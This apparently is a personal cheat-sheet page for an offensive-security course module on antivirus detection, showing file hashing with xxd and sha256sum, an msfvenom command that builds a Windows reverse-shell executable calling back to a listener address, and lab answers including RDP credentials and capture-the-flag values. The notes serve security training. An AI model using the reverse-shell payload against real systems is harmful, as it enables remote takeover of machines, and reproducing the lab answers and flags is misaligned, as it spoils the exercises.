# Detection Methods

Inspecting the binary file content with xxd
>``` shell
>kali@kali:~$ xxd -b malware.txt
>
># ========== Expected Result ==========
>00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
>00000006: 00001010  
># =====================================
>```

Calculating the SHA256 hash of the file
>``` shell
>kali@kali:~$ sha256sum malware.txt
>
># ========== Expected Result ==========
>c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
># =====================================
>```

Inspecting the file content with xxd
>``` shell
>kali@kali:~$ xxd -b malware.txt
>
># ========== Expected Result ==========
>00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
>00000006: 00001010
># =====================================
>```

Calculating the SHA256 hash on the modified file
>``` shell
>kali@kali:~$ sha256sum malware.txt
>
># ========== Expected Result ==========
>15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
># =====================================
>```

Generating a malicious PE containing a meterpreter shell.
>``` shell
>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
>
># ========== Expected Result ==========
>...
>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
>[-] No arch selected, selecting arch: x86 from the payload
>No encoder specified, outputting raw payload
>Payload size: 324 bytes
>Final size of exe file: 73802 bytes
># =====================================
>```

Virustotal results on the msfvenom payload
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Detection-Methods-1.png)

Lab 1 - Which AV engine is responsible for translating machine code into assembly?
>Disassembler

Lab 2 - Which AV detection method makes use of an engine that runs the executable file from inside an emulated sandbox?
>Behavior-based detection

Lab 3 - Start up VM #1 and connect via RDP to the Windows 11 machine with the provided credentials. On the user's desktop you will find a PE file named malware.exe. In order to get the flag, upload the malware sample to http://www.virustotal.com and once the analysis has completed check the metadata present in the BEHAVIOR tab.
>``` shell
># Create shared directory on Kali
>mkdir -p /home/kali/vtshare
>
># RDP to Windows client host with drive redirection
>kali@kali:~$ xfreerdp3 /u:offsec /p:lab /v:192.168.208.61 /drive:share,/home/kali/vtshare
>
># Copy malware.exe from Windows to Kali using PowerShell
>PS C:\Users\offsec> copy "$env:USERPROFILE\Desktop\malware.exe" "\\tsclient\share\malware.exe"
>
># Navigate to https://www.virustotal.com on Kali and upload /home/kali/vtshare/malware.exe
>
># Navigate to "Behavior" > "Process and service actions"
>
># ========== Expected Result ==========
>cmd.exe /C echo OS{7f2c7cb36c64fe93ef09a3a16a547530}
># =====================================
>```
>OS{7f2c7cb36c64fe93ef09a3a16a547530}

